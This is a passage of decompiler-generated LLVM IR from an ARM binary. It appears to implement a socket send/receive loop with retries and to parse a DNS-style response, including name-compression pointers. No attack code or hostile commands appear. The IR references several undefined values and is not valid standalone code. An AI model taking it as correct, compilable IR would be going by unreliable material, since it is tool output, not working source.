  store i32 16384, i32* @r3, align 4
  %v4_fb94 = call i32 @function_13884(i32 %v0_fb84, i32 %v2_fa30, i32 %v1_fabc, i32 16384)
  store i32 %v4_fb94, i32* %r0.global-to-local, align 4
  %v7_fb98 = icmp eq i32 %v4_fb94, -1
  store i1 %v7_fb98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb98, label %dec_label_pc_fcb8, label %dec_label_pc_fba0

dec_label_pc_fba0:                                ; preds = %dec_label_pc_fb84
  %v0_fba0 = load i32, i32* @r6, align 4
  store i32 %v0_fba0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_fbac = call i32 @function_12f80(i32 3, i32 %v0_fba0)
  %v0_fbb0 = load i32, i32* @r6, align 4
  store i32 %v0_fbb0, i32* %r1.global-to-local, align 4
  %v1_fbb4 = or i32 %v2_fbac, 2048
  store i32 %v1_fbb4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_fbbc = call i32 @function_12f80(i32 4, i32 %v0_fbb0)
  store i32 %v2_fbbc, i32* %r0.global-to-local, align 4
  store i32 %v2_fa9c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_fbd0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fbd8

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fbd8, %dec_label_pc_fba0
  %v1_fbdc = phi i32 [ %v1_fbe0, %dec_label_pc_fbd8 ], [ 4, %dec_label_pc_fba0 ]
  store i32 0, i32* @r4, align 4
  %v3_fbdc = add i32 %v1_fbdc, %v2_fbd0
  %v4_fbdc = inttoptr i32 %v3_fbdc to i32*
  store i32 0, i32* %v4_fbdc, align 4
  %v0_fbe0 = load i32, i32* %r3.global-to-local, align 4
  %v1_fbe0 = add i32 %v0_fbe0, 4
  store i32 %v1_fbe0, i32* %r3.global-to-local, align 4
  %v7_fbe4 = icmp eq i32 %v1_fbe0, 128
  br i1 %v7_fbe4, label %dec_label_pc_fbec, label %dec_label_pc_fbd8

dec_label_pc_fbec:                                ; preds = %dec_label_pc_fbd8
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_fbec = load i32, i32* @r6, align 4
  %v3_fbec = udiv i32 %v0_fbec, 32
  %v3_fbf4 = mul nuw nsw i32 %v3_fbec, 4
  store i32 %v3_fbf4, i32* %r3.global-to-local, align 4
  %v2_fbfc = add i32 %v3_fbf4, %v2_fbf8
  store i32 %v2_fbfc, i32* @r5, align 4
  %v1_fc00 = add i32 %v2_fbfc, -156
  %v2_fc00 = inttoptr i32 %v1_fc00 to i32*
  %v3_fc00 = load i32, i32* %v2_fc00, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_fc08 = urem i32 %v0_fbec, 32
  store i32 %v1_fc08, i32* @r7, align 4
  %v7_fc0c = shl i32 1, %v1_fc08
  %v8_fc0c = or i32 %v3_fc00, %v7_fc0c
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_fc0c, i32* %v2_fc00, align 4
  %v0_fc1c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_fc1c, i32* %stack_var_-52, align 4
  store i32 %v2_fc24, i32* @lr, align 4
  store i32 %v2_fa9c, i32* @ip, align 4
  %v0_fc2c = load i32, i32* @r6, align 4
  %v1_fc2c = load i32, i32* %r3.global-to-local, align 4
  %v2_fc2c = add i32 %v1_fc2c, %v0_fc2c
  store i32 %v2_fc2c, i32* %r0.global-to-local, align 4
  %v0_fc34 = load i32, i32* @r4, align 4
  store i32 %v0_fc34, i32* %r2.global-to-local, align 4
  store i32 %v0_fc34, i32* %r3.global-to-local, align 4
  %v5_fc40 = call i32 @function_12e3c(i32 %v2_fc2c, i32 %v2_fbd0, i32 %v0_fc34, i32 %v0_fc34, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_fc40, i32* %r0.global-to-local, align 4
  %v7_fc44 = icmp eq i32 %v5_fc40, -1
  store i1 %v7_fc44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc44, label %dec_label_pc_fcc8, label %dec_label_pc_fc4c

dec_label_pc_fc4c:                                ; preds = %dec_label_pc_fbec
  %v1_fc4c = load i32, i32* @r4, align 4
  %v9_fc4c = icmp eq i32 %v5_fc40, %v1_fc4c
  store i1 %v9_fc4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fc4c, label %dec_label_pc_fca8, label %dec_label_pc_fc54

dec_label_pc_fc54:                                ; preds = %dec_label_pc_fc4c
  %v0_fc54 = load i32, i32* @r5, align 4
  %v1_fc54 = add i32 %v0_fc54, -156
  %v2_fc54 = inttoptr i32 %v1_fc54 to i32*
  %v3_fc54 = load i32, i32* %v2_fc54, align 4
  %v1_fc58 = load i32, i32* @r7, align 4
  %v6_fc58 = ashr i32 %v3_fc54, %v1_fc58
  store i32 %v6_fc58, i32* %r3.global-to-local, align 4
  %v1_fc5c = urem i32 %v6_fc58, 2
  %v2_fc5c = icmp eq i32 %v1_fc5c, 0
  store i1 %v2_fc5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc5c, label %dec_label_pc_fcc8, label %dec_label_pc_fc64

dec_label_pc_fc64:                                ; preds = %dec_label_pc_fc54
  store i32 %v2_fc68, i32* @r5, align 4
  store i32 %v2_fc68, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc78 = load i32, i32* @r6, align 4
  store i32 %v0_fc78, i32* %r0.global-to-local, align 4
  %v6_fc84 = call i32 @function_13848(i32 %v0_fc78, i32 %v2_fc68, i32 2048, i32 16384, i32 %v1_fc4c, i32 %v1_fc4c)
  store i32 %v6_fc84, i32* %r4.global-to-local, align 4
  %v0_fc8c = load i32, i32* @sb, align 4
  store i32 %v0_fc8c, i32* %r0.global-to-local, align 4
  %v1_fc90 = inttoptr i32 %v0_fc8c to i8*
  %v2_fc90 = call i32 @function_12480(i8* %v1_fc90)
  %v1_fc94 = add i32 %v2_fc90, 17
  store i32 %v1_fc94, i32* %r0.global-to-local, align 4
  %v0_fc98 = load i32, i32* %r4.global-to-local, align 4
  %v3_fc98 = icmp ult i32 %v0_fc98, %v1_fc94
  %v9_fc98 = icmp eq i32 %v0_fc98, %v1_fc94
  store i1 %v9_fc98, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_fc98, label %dec_label_pc_fca8, label %dec_label_pc_fcfc

dec_label_pc_fca8:                                ; preds = %dec_label_pc_fc64, %dec_label_pc_fcfc, %dec_label_pc_fd28, %dec_label_pc_fc4c, %dec_label_pc_fcf0
  %v0_fca8 = load i32, i32* @r8, align 4
  %v7_fca8 = icmp eq i32 %v0_fca8, 5
  store i1 %v7_fca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fca8, label %dec_label_pc_fcc8, label %dec_label_pc_fcb0

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fcb8, %dec_label_pc_fca8
  %v0_fcb0 = phi i32 [ %v0_fcc0, %dec_label_pc_fcb8 ], [ %v0_fca8, %dec_label_pc_fca8 ]
  %v1_fcb0 = add i32 %v0_fcb0, 1
  %v0_fb44.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_fb44

dec_label_pc_fcb8:                                ; preds = %dec_label_pc_fb84, %dec_label_pc_fb6c
  %v0_fcb8 = phi i32 [ %v4_fb94, %dec_label_pc_fb84 ], [ %v3_fb78, %dec_label_pc_fb6c ]
  %v1_fcb8 = add i32 %v0_fcb8, 2
  store i32 %v1_fcb8, i32* %r0.global-to-local, align 4
  %v1_fcbc = call i32 @function_1524c(i32 %v1_fcb8)
  store i32 %v1_fcbc, i32* %r0.global-to-local, align 4
  %v0_fcc0 = load i32, i32* @r8, align 4
  %v7_fcc0 = icmp eq i32 %v0_fcc0, 5
  store i1 %v7_fcc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcc0, label %dec_label_pc_fcc8, label %dec_label_pc_fcb0

dec_label_pc_fcc8:                                ; preds = %dec_label_pc_fcb8, %dec_label_pc_fca8, %dec_label_pc_fc54, %dec_label_pc_fbec, %dec_label_pc_fd34, %dec_label_pc_fd40.backedge
  %v0_fcc8 = load i32, i32* @r6, align 4
  store i32 %v0_fcc8, i32* %r0.global-to-local, align 4
  %v1_fccc = call i32 @function_1314c(i32 %v0_fcc8)
  store i32 %v1_fccc, i32* %r0.global-to-local, align 4
  %v0_fcd0 = load i32, i32* @fp, align 4
  %v1_fcd0 = inttoptr i32 %v0_fcd0 to i8*
  %v2_fcd0 = load i8, i8* %v1_fcd0, align 1
  %v3_fcd0 = zext i8 %v2_fcd0 to i32
  store i32 %v3_fcd0, i32* @r4, align 4
  %v2_fcd4 = icmp eq i8 %v2_fcd0, 0
  store i1 %v2_fcd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fcd4, label %dec_label_pc_fe18, label %dec_label_pc_fcdc

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_fcc8, %dec_label_pc_fe18
  %v0_fcdc = phi i32 [ %v0_fcd0, %dec_label_pc_fcc8 ], [ %v0_fe2c, %dec_label_pc_fe18 ]
  store i32 %v0_fcdc, i32* %r0.global-to-local, align 4
  store i32 %v3_fa04, i32* @r4, align 4
  store i32 %v9_fa04, i32* @r6, align 4
  store i32 %v12_fa04, i32* @r7, align 4
  store i32 %v15_fa04, i32* @r8, align 4
  store i32 %v18_fa04, i32* @sb, align 4
  store i32 %v21_fa04, i32* @sl, align 4
  store i32 %v24_fa04, i32* @fp, align 4
  store i32 %v27_fa04, i32* @lr, align 4
  ret i32 %v0_fcdc

dec_label_pc_fcf0:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fcf4 = call i32 @function_1524c(i32 1)
  store i32 %v1_fcf4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fca8

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fc64
  store i32 %v2_fcfc, i32* @sb, align 4
  store i32 %v2_fcfc, i32* %r0.global-to-local, align 4
  %v2_fd04 = call i32 @function_12480(i8* %v1_fd04)
  %v4_fd10 = load i16, i16* %stack_var_-4292, align 2
  %v5_fd10 = sext i16 %v4_fd10 to i32
  store i32 %v5_fd10, i32* %r3.global-to-local, align 4
  store i32 %v6_fad4, i32* %r1.global-to-local, align 4
  %v1_fd18 = load i32, i32* @sb, align 4
  %v9_fd1c = icmp eq i16 %v4_fd10, %v5_faec
  store i1 %v9_fd1c, i1* %cpsr_z.global-to-local, align 1
  %v2_fd18 = add i32 %v2_fd04, 5
  %v1_fd20 = add i32 %v2_fd18, %v1_fd18
  store i32 %v1_fd20, i32* %r0.global-to-local, align 4
  br i1 %v9_fd1c, label %dec_label_pc_fd28, label %dec_label_pc_fca8

dec_label_pc_fd28:                                ; preds = %dec_label_pc_fcfc
  store i32 %v4_fd28, i32* %r3.global-to-local, align 4
  store i1 %v2_fd2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd2c, label %dec_label_pc_fca8, label %dec_label_pc_fd34

dec_label_pc_fd34:                                ; preds = %dec_label_pc_fd28
  %div = udiv i16 %tmp79, 256
  %v3_fd34 = zext i16 %div to i32
  store i32 %v3_fd34, i32* %r2.global-to-local, align 4
  %v1_fd38 = mul nuw nsw i32 %v4_fd28, 256
  %v4_fd3c = and i32 %v1_fd38, 65280
  %v5_fd3c = or i32 %v4_fd3c, %v3_fd34
  %v1_fd40134 = add nsw i32 %v5_fd3c, -1
  %v3_fd44135 = mul i32 %v1_fd40134, 65536
  store i32 %v3_fd44135, i32* %r3.global-to-local, align 4
  %v7_fd48141 = icmp eq i32 %v3_fd44135, -65536
  store i1 %v7_fd48141, i1* %cpsr_z.global-to-local, align 1
  %v3_fd4c142 = urem i32 %v1_fd40134, 65536
  store i32 %v3_fd4c142, i32* @r8, align 4
  br i1 %v7_fd48141, label %dec_label_pc_fcc8, label %dec_label_pc_fd54

dec_label_pc_fd54:                                ; preds = %dec_label_pc_fd34, %dec_label_pc_fd40.backedge
  %v3_fd4c144 = phi i32 [ %v3_fd4c, %dec_label_pc_fd40.backedge ], [ %v3_fd4c142, %dec_label_pc_fd34 ]
  %v0_fda4143 = phi i32 [ %storemerge29, %dec_label_pc_fd40.backedge ], [ %v1_fd20, %dec_label_pc_fd34 ]
  store i32 %v0_fda4143, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* @ip, align 4
  %v1_fd6018 = inttoptr i32 %v0_fda4143 to i8*
  %v2_fd6019 = load i8, i8* %v1_fd6018, align 1
  %v3_fd6020 = zext i8 %v2_fd6019 to i32
  store i32 %v3_fd6020, i32* %r2.global-to-local, align 4
  %v2_fd6421 = icmp eq i8 %v2_fd6019, 0
  store i1 %v2_fd6421, i1* %cpsr_z.global-to-local, align 1
  %v3_fd6822 = mul nuw nsw i32 %v3_fd6020, 256
  store i32 %v3_fd6822, i32* %r1.global-to-local, align 4
  br i1 %v2_fd6421, label %dec_label_pc_fd9c, label %dec_label_pc_fd70.preheader

dec_label_pc_fd70.preheader:                      ; preds = %dec_label_pc_fd54, %dec_label_pc_fd60.backedge
  %v1_fe3c = phi i32 [ %v1_fe3c50, %dec_label_pc_fd60.backedge ], [ 1, %dec_label_pc_fd54 ]
  %v0_fe3448 = phi i32 [ %v0_fe34, %dec_label_pc_fd60.backedge ], [ 0, %dec_label_pc_fd54 ]
  %v0_fd7c46 = phi i32 [ %v3_fd68, %dec_label_pc_fd60.backedge ], [ %v3_fd6822, %dec_label_pc_fd54 ]
  %v0_fd7844 = phi i32 [ %v1_fe38, %dec_label_pc_fd60.backedge ], [ %v0_fda4143, %dec_label_pc_fd54 ]
  %v0_fd7042 = phi i32 [ %v3_fd60, %dec_label_pc_fd60.backedge ], [ %v3_fd6020, %dec_label_pc_fd54 ]
  br label %dec_label_pc_fd70

dec_label_pc_fd70:                                ; preds = %dec_label_pc_fd70.preheader, %dec_label_pc_fd78
  %v0_fe34 = phi i32 [ %v0_fe3448, %dec_label_pc_fd70.preheader ], [ 1, %dec_label_pc_fd78 ]
  %v0_fd7c = phi i32 [ %v0_fd7c46, %dec_label_pc_fd70.preheader ], [ %v3_fd94, %dec_label_pc_fd78 ]
  %v0_fe38 = phi i32 [ %v0_fd7844, %dec_label_pc_fd70.preheader ], [ %v2_fd84, %dec_label_pc_fd78 ]
  %v0_fd70 = phi i32 [ %v0_fd7042, %dec_label_pc_fd70.preheader ], [ %v3_fd88, %dec_label_pc_fd78 ]
  %v7_fd70 = icmp eq i32 %v0_fd70, 191
  store i1 %v7_fd70, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_fd70, 192
  br i1 %tmp, label %dec_label_pc_fe34, label %dec_label_pc_fd78

dec_label_pc_fd78:                                ; preds = %dec_label_pc_fd70
  %v1_fd78 = add i32 %v0_fe38, 1
  %v2_fd78 = inttoptr i32 %v1_fd78 to i8*
  %v3_fd78 = load i8, i8* %v2_fd78, align 1
  %v4_fd78 = zext i8 %v3_fd78 to i32
  %v2_fd7c = or i32 %v4_fd78, -49152
  %v0_fd84 = load i32, i32* @r5, align 4
  %v1_fd80 = add i32 %v0_fd84, %v0_fd7c
  %v2_fd84 = add i32 %v1_fd80, %v2_fd7c
  store i32 %v2_fd84, i32* %r3.global-to-local, align 4
  %v1_fd88 = inttoptr i32 %v2_fd84 to i8*
  %v2_fd88 = load i8, i8* %v1_fd88, align 1
  %v3_fd88 = zext i8 %v2_fd88 to i32
  store i32 %v3_fd88, i32* %r2.global-to-local, align 4
  %v2_fd8c = icmp eq i8 %v2_fd88, 0
  store i1 %v2_fd8c, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_fd94 = mul nuw nsw i32 %v3_fd88, 256
  store i32 %v3_fd94, i32* %r1.global-to-local, align 4
  br i1 %v2_fd8c, label %dec_label_pc_fd9c, label %dec_label_pc_fd70

dec_label_pc_fd9c:                                ; preds = %dec_label_pc_fd60.backedge, %dec_label_pc_fd78, %dec_label_pc_fd54
  %v1_fda0 = phi i32 [ 1, %dec_label_pc_fd54 ], [ %v1_fe3c, %dec_label_pc_fd78 ], [ %v1_fe3c50, %dec_label_pc_fd60.backedge ]
  %v0_fd9c = phi i32 [ 0, %dec_label_pc_fd54 ], [ 1, %dec_label_pc_fd78 ], [ %v0_fe34, %dec_label_pc_fd60.backedge ]
  %v7_fd9c = icmp eq i32 %v0_fd9c, 1
  store i1 %v7_fd9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd9c, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_fd9c
  %v2_fda0 = add i32 %v1_fda0, 1
  store i32 %v2_fda0, i32* @ip, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_fd9c, %bb119
  %v1_fda4 = phi i32 [ %v1_fda0, %dec_label_pc_fd9c ], [ %v2_fda0, %bb119 ]
  %v2_fda4 = add i32 %v1_fda4, %v0_fda4143
  store i32 %v2_fda4, i32* @r4, align 4
  %v3_fda8 = inttoptr i32 %v2_fda4 to i8*
  %v4_fda8 = load i8, i8* %v3_fda8, align 1
  %v6_fda8 = zext i8 %v4_fda8 to i32
  store i32 %v6_fda8, i32* %r3.global-to-local, align 4
  %v1_fdac = add i32 %v2_fda4, 1
  %v2_fdac = inttoptr i32 %v1_fdac to i8*
  %v3_fdac = load i8, i8* %v2_fdac, align 1
  %v4_fdac = zext i8 %v3_fdac to i32
  store i32 %v4_fdac, i32* %r2.global-to-local, align 4
  %v4_fdb0 = mul nuw nsw i32 %v4_fdac, 256
  %v5_fdb0 = or i32 %v4_fdb0, %v6_fda8
  store i32 %v5_fdb0, i32* %r3.global-to-local, align 4
  %v7_fdb4 = icmp eq i32 %v5_fdb0, 256
  store i1 %v7_fdb4, i1* %cpsr_z.global-to-local, align 1
  %v1_fdb8 = add i32 %v2_fda4, 10
  store i32 %v1_fdb8, i32* @r7, align 4
  br i1 %v7_fdb4, label %dec_label_pc_fe54, label %dec_label_pc_fdc0

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_fe54, %bb120
  store i32 %v1_fdb8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fdcc24 = inttoptr i32 %v1_fdb8 to i8*
  %v2_fdcc25 = load i8, i8* %v1_fdcc24, align 1
  %v3_fdcc26 = zext i8 %v2_fdcc25 to i32
  store i32 %v3_fdcc26, i32* %r2.global-to-local, align 4
  %v2_fdd027 = icmp eq i8 %v2_fdcc25, 0
  store i1 %v2_fdd027, i1* %cpsr_z.global-to-local, align 1
  %v3_fdd428 = mul nuw nsw i32 %v3_fdcc26, 256
  store i32 %v3_fdd428, i32* %r1.global-to-local, align 4
  br i1 %v2_fdd027, label %dec_label_pc_fe08, label %dec_label_pc_fddc.preheader

dec_label_pc_fddc.preheader:                      ; preds = %dec_label_pc_fdc0, %dec_label_pc_fdcc.backedge
  %v1_fe4c = phi i32 [ %v1_fe4c65, %dec_label_pc_fdcc.backedge ], [ 1, %dec_label_pc_fdc0 ]
  %v0_fe4463 = phi i32 [ %v0_fe44, %dec_label_pc_fdcc.backedge ], [ 0, %dec_label_pc_fdc0 ]
  %v0_fde861 = phi i32 [ %v3_fdd4, %dec_label_pc_fdcc.backedge ], [ %v3_fdd428, %dec_label_pc_fdc0 ]
  %v0_fde459 = phi i32 [ %v1_fe48, %dec_label_pc_fdcc.backedge ], [ %v1_fdb8, %dec_label_pc_fdc0 ]
  %v0_fddc57 = phi i32 [ %v3_fdcc, %dec_label_pc_fdcc.backedge ], [ %v3_fdcc26, %dec_label_pc_fdc0 ]
  br label %dec_label_pc_fddc

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fddc.preheader, %dec_label_pc_fde4
  %v0_fe44 = phi i32 [ %v0_fe4463, %dec_label_pc_fddc.preheader ], [ 1, %dec_label_pc_fde4 ]
  %v0_fde8 = phi i32 [ %v0_fde861, %dec_label_pc_fddc.preheader ], [ %v3_fe00, %dec_label_pc_fde4 ]
  %v0_fe48 = phi i32 [ %v0_fde459, %dec_label_pc_fddc.preheader ], [ %v2_fdf0, %dec_label_pc_fde4 ]
  %v0_fddc = phi i32 [ %v0_fddc57, %dec_label_pc_fddc.preheader ], [ %v3_fdf4, %dec_label_pc_fde4 ]
  %v7_fddc = icmp eq i32 %v0_fddc, 191
  store i1 %v7_fddc, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_fddc, 192
  br i1 %tmp159, label %dec_label_pc_fe44, label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fddc
  %v1_fde4 = add i32 %v0_fe48, 1
  %v2_fde4 = inttoptr i32 %v1_fde4 to i8*
  %v3_fde4 = load i8, i8* %v2_fde4, align 1
  %v4_fde4 = zext i8 %v3_fde4 to i32
  %v2_fde8 = or i32 %v4_fde4, -49152
  %v0_fdf0 = load i32, i32* @r5, align 4
  %v1_fdec = add i32 %v0_fdf0, %v0_fde8
  %v2_fdf0 = add i32 %v1_fdec, %v2_fde8
  store i32 %v2_fdf0, i32* %r3.global-to-local, align 4
  %v1_fdf4 = inttoptr i32 %v2_fdf0 to i8*
  %v2_fdf4 = load i8, i8* %v1_fdf4, align 1
  %v3_fdf4 = zext i8 %v2_fdf4 to i32
  store i32 %v3_fdf4, i32* %r2.global-to-local, align 4
  %v2_fdf8 = icmp eq i8 %v2_fdf4, 0
  store i1 %v2_fdf8, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @ip, align 4
  %v3_fe00 = mul nuw nsw i32 %v3_fdf4, 256
  store i32 %v3_fe00, i32* %r1.global-to-local, align 4
  br i1 %v2_fdf8, label %dec_label_pc_fe08, label %dec_label_pc_fddc

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fdcc.backedge, %dec_label_pc_fde4, %dec_label_pc_fdc0
  %v1_fe0c = phi i32 [ 1, %dec_label_pc_fdc0 ], [ %v1_fe4c, %dec_label_pc_fde4 ], [ %v1_fe4c65, %dec_label_pc_fdcc.backedge ]
  %v0_fe08 = phi i32 [ 0, %dec_label_pc_fdc0 ], [ 1, %dec_label_pc_fde4 ], [ %v0_fe44, %dec_label_pc_fdcc.backedge ]
  %v7_fe08 = icmp eq i32 %v0_fe08, 1
  store i1 %v7_fe08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe08, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_fe08
  %v2_fe0c = add i32 %v1_fe0c, 1
  store i32 %v2_fe0c, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_fe68, %dec_label_pc_fe08, %bb121
  %v1_fe10 = phi i32 [ %v5_fe80, %dec_label_pc_fe68 ], [ %v1_fe0c, %dec_label_pc_fe08 ], [ %v2_fe0c, %bb121 ]
  %v2_fe10 = add i32 %v1_fe10, %v1_fdb8
  br label %dec_label_pc_fd40.backedge

dec_label_pc_fd40.backedge:                       ; preds = %bb122, %dec_label_pc_fe8c
  %v0_fd40.pre = phi i32 [ %v3_fd4c144, %bb122 ], [ %v0_fd40.pre.pre, %dec_label_pc_fe8c ]
  %storemerge29 = phi i32 [ %v2_fe10, %bb122 ], [ %v2_ff04, %dec_label_pc_fe8c ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_fd40 = add i32 %v0_fd40.pre, -1
  %v3_fd44 = mul i32 %v1_fd40, 65536
  store i32 %v3_fd44, i32* %r3.global-to-local, align 4
  %v7_fd48 = icmp eq i32 %v3_fd44, -65536
  store i1 %v7_fd48, i1* %cpsr_z.global-to-local, align 1
  %v3_fd4c = urem i32 %v1_fd40, 65536
  store i32 %v3_fd4c, i32* @r8, align 4
  br i1 %v7_fd48, label %dec_label_pc_fcc8, label %dec_label_pc_fd54

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fcc8
  %v1_fe18 = add i32 %v0_fcd0, 4
  %v2_fe18 = inttoptr i32 %v1_fe18 to i32*
  %v3_fe18 = load i32, i32* %v2_fe18, align 4
  store i32 %v3_fe18, i32* %r0.global-to-local, align 4
  %v2_fe1c = icmp eq i32 %v3_fe18, 0
  store i1 %v2_fe1c, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_fe24.179 to i32), i32* @lr, align 4
  %v1_fe20 = xor i1 %v2_fe1c, true
  call void @__pseudo_cond_branch(i1 %v1_fe20, i32 ptrtoint (i32* @global_var_14bf4.55 to i32))
  %v0_fe24 = load i32, i32* @fp, align 4
  store i32 %v0_fe24, i32* @r0, align 4
  %v0_fe28 = call i32 @function_14bf4()
  store i32 %v0_fe28, i32* %r0.global-to-local, align 4
  %v0_fe2c = load i32, i32* @r4, align 4
  br label %dec_label_pc_fcdc

dec_label_pc_fe34:                                ; preds = %dec_label_pc_fd70
  %v2_fe34 = icmp eq i32 %v0_fe34, 0
  store i1 %v2_fe34, i1* %cpsr_z.global-to-local, align 1
  %v1_fe38 = add i32 %v0_fe38, 1
  store i32 %v1_fe38, i32* %r3.global-to-local, align 4
  br i1 %v2_fe34, label %bb123, label %dec_label_pc_fd60.backedge

dec_label_pc_fd60.backedge:                       ; preds = %dec_label_pc_fe34, %bb123
  %v1_fe3c50 = phi i32 [ %v1_fe3c, %dec_label_pc_fe34 ], [ %v2_fe3c, %bb123 ]
  %v1_fd60 = inttoptr i32 %v1_fe38 to i8*
  %v2_fd60 = load i8, i8* %v1_fd60, align 1
  %v3_fd60 = zext i8 %v2_fd60 to i32
  store i32 %v3_fd60, i32* %r2.global-to-local, align 4
  %v2_fd64 = icmp eq i8 %v2_fd60, 0
  store i1 %v2_fd64, i1* %cpsr_z.global-to-local, align 1
  %v3_fd68 = mul nuw nsw i32 %v3_fd60, 256
  store i32 %v3_fd68, i32* %r1.global-to-local, align 4
  br i1 %v2_fd64, label %dec_label_pc_fd9c, label %dec_label_pc_fd70.preheader

bb123:                                            ; preds = %dec_label_pc_fe34
  %v2_fe3c = add i32 %v1_fe3c, 1
  store i32 %v2_fe3c, i32* @ip, align 4
  br label %dec_label_pc_fd60.backedge

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fddc
  %v2_fe44 = icmp eq i32 %v0_fe44, 0
  store i1 %v2_fe44, i1* %cpsr_z.global-to-local, align 1
  %v1_fe48 = add i32 %v0_fe48, 1
  store i32 %v1_fe48, i32* %r3.global-to-local, align 4
  br i1 %v2_fe44, label %bb124, label %dec_label_pc_fdcc.backedge

dec_label_pc_fdcc.backedge:                       ; preds = %dec_label_pc_fe44, %bb124
  %v1_fe4c65 = phi i32 [ %v1_fe4c, %dec_label_pc_fe44 ], [ %v2_fe4c, %bb124 ]
  %v1_fdcc = inttoptr i32 %v1_fe48 to i8*
  %v2_fdcc = load i8, i8* %v1_fdcc, align 1
  %v3_fdcc = zext i8 %v2_fdcc to i32
  store i32 %v3_fdcc, i32* %r2.global-to-local, align 4
  %v2_fdd0 = icmp eq i8 %v2_fdcc, 0
  store i1 %v2_fdd0, i1* %cpsr_z.global-to-local, align 1
  %v3_fdd4 = mul nuw nsw i32 %v3_fdcc, 256
  store i32 %v3_fdd4, i32* %r1.global-to-local, align 4
  br i1 %v2_fdd0, label %dec_label_pc_fe08, label %dec_label_pc_fddc.preheader

bb124:                                            ; preds = %dec_label_pc_fe44
  %v2_fe4c = add i32 %v1_fe4c, 1
  store i32 %v2_fe4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fdcc.backedge

dec_label_pc_fe54:                                ; preds = %bb120
  %v1_fe54 = add i32 %v2_fda4, 2
  %v2_fe54 = inttoptr i32 %v1_fe54 to i8*
  %v3_fe54 = load i8, i8* %v2_fe54, align 1
  %v4_fe54 = zext i8 %v3_fe54 to i32
  store i32 %v4_fe54, i32* %r3.global-to-local, align 4
  %v1_fe58 = add i32 %v2_fda4, 3
  %v2_fe58 = inttoptr i32 %v1_fe58 to i8*
  %v3_fe58 = load i8, i8* %v2_fe58, align 1
  %v4_fe58 = zext i8 %v3_fe58 to i32
  store i32 %v4_fe58, i32* %r2.global-to-local, align 4
  %v4_fe5c = mul nuw nsw i32 %v4_fe58, 256
  %v5_fe5c = or i32 %v4_fe5c, %v4_fe54
  store i32 %v5_fe5c, i32* %r3.global-to-local, align 4
  %v7_fe60 = icmp eq i32 %v5_fe5c, 256
  store i1 %v7_fe60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe60, label %dec_label_pc_fe68, label %dec_label_pc_fdc0

dec_label_pc_fe68:                                ; preds = %dec_label_pc_fe54
  %v1_fe68 = add i32 %v2_fda4, 9
  %v2_fe68 = inttoptr i32 %v1_fe68 to i8*
  %v3_fe68 = load i8, i8* %v2_fe68, align 1
  %v4_fe68 = zext i8 %v3_fe68 to i32
  store i32 %v4_fe68, i32* %r2.global-to-local, align 4
  %v1_fe6c = add i32 %v2_fda4, 8
  %v2_fe6c = inttoptr i32 %v1_fe6c to i8*
  %v3_fe6c = load i8, i8* %v2_fe6c, align 1
  %v4_fe6c = zext i8 %v3_fe6c to i32
  %v4_fe70 = mul nuw nsw i32 %v4_fe68, 256
  %v5_fe70 = or i32 %v4_fe6c, %v4_fe70
  %v3_fe74 = mul i32 %v5_fe70, 65536
  store i32 %v3_fe74, i32* %r3.global-to-local, align 4
  %v3_fe78 = mul nuw nsw i32 %v4_fe6c, 256
  store i32 %v3_fe78, i32* %r2.global-to-local, align 4
  %v5_fe80 = or i32 %v3_fe78, %v4_fe68
